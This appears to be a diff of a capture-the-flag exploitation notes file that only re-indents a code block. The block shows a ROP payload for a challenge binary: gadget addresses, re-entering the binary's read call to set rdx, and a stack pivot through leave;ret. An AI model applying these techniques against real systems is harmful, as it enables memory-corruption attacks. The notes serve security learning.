@@ -117,18 +117,18 @@ After calling libc functions (especially `puts`), `rdx` is often clobbered to a 
 **Solutions:**
 1. **pop rdx gadget from libc** -- `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
 2. **Re-enter binary's read setup** -- Jump to code that sets `rdx` before `read`:
-   ```python
-   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
-   # Set rbp first so rbp-0x40 points to target buffer:
-   POP_RBP_RET = 0x40113d
-   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]
+```python
+# vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
+# Set rbp first so rbp-0x40 points to target buffer:
+POP_RBP_RET = 0x40113d
+VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]
 
-   payload += p64(POP_RBP_RET)
-   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
-   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
-   # WARNING: After read, code continues to printf + leave;ret
-   # leave sets rsp=rbp, so you get a stack pivot to rbp!
-   ```
+payload += p64(POP_RBP_RET)
+payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
+payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
+# WARNING: After read, code continues to printf + leave;ret
+# leave sets rsp=rbp, so you get a stack pivot to rbp!
+```
 3. **Stack pivot via leave;ret** -- When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.
 
 ### Shell Interaction After execve
